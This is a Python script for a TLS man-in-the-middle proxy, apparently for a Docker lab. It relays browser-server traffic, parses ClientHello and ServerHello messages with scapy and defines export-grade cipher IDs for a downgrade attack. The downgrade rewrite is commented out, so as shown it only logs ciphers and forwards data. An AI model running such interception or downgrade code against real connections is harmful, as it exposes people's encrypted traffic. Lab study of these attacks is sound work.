import socket
import threading
import logging

from scapy.all import *
from scapy.layers.tls.all import *

LISTEN_HOST = '0.0.0.0'
LISTEN_PORT = 8443  # Port for browser to connect to proxy
SERVER_HOST = 'server'  # Docker Compose service name or IP
SERVER_PORT = 8443      # Real server port

EXPORT_CIPHERS = [ 0x0004, 0x0005, 0x0006, 0x0008, 0x0009, 0x0012, 0x0013, 0x0014, 0x0015 ]

logger = logging.getLogger("mitm-proxy")
if not logger.hasHandlers():
    logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')


def parse_and_modify_clienthello(data):
    # Parse the TLS record
    logger.info("Parsing intercepted data")
    pkt = TLS(data)
    if TLSClientHello in pkt:
        logger.info("TLS ClientHello detected")
        hello = pkt[TLSClientHello]
        logger.info("Original ciphers: %s", hello.ciphers)
        orig_len = len(hello.ciphers)
        # Modify the cipher suites to only include EXPORT ciphers
        # new_ciphers = (EXPORT_CIPHERS * ((orig_len // len(EXPORT_CIPHERS)) + 1))[:orig_len]
        # hello.ciphers = new_ciphers
        # logger.info("Modified ciphers: %s", hello.ciphers)
        return bytes(pkt)
    return data

def parse_serverhello(data):
    # Parse the TLS record
    logger.info("Parsing intercepted server data")
    pkt = TLS(data)
    if TLSServerHello in pkt:
        logger.info("TLS ServerHello detected")
        hello = pkt[TLSServerHello]
        logger.info("Server selected cipher: %s", hello.cipher)
        return bytes(pkt)
    return data

def forward(src, dst, direction):
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            # Here you can inspect or modify 'data' before sending
            if direction == 'client->server':
                new_data = parse_and_modify_clienthello(data)
            else:
                new_data = parse_serverhello(data)
            logger.info(f"Forwarding {len(new_data)} bytes {direction}")
            dst.sendall(new_data)
    except Exception as e:
        logger.warning(f"Exception in forwarding ({direction}): {e}")
    finally:
        src.close()
        dst.close()

def handle_client(client_sock, client_addr):
    try:
        server_sock = socket.create_connection((SERVER_HOST, SERVER_PORT))
        logger.info(f"Accepted connection from {client_addr}, forwarding to {SERVER_HOST}:{SERVER_PORT}")
        threading.Thread(target=forward, args=(client_sock, server_sock, 'client->server')).start()
        threading.Thread(target=forward, args=(server_sock, client_sock, 'server->client')).start()
    except Exception as e:
        logger.error(f"Error handling client {client_addr}: {e}")
        client_sock.close()

def main():
    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listen_sock.bind((LISTEN_HOST, LISTEN_PORT))
    listen_sock.listen(5)
    logger.info(f"Proxy listening on {LISTEN_HOST}:{LISTEN_PORT}, forwarding to {SERVER_HOST}:{SERVER_PORT}")
    while True:
        client_sock, addr = listen_sock.accept()
        logger.info(f"Accepted connection from {addr}")
        threading.Thread(target=handle_client, args=(client_sock, addr)).start()

if __name__ == '__main__':
    main()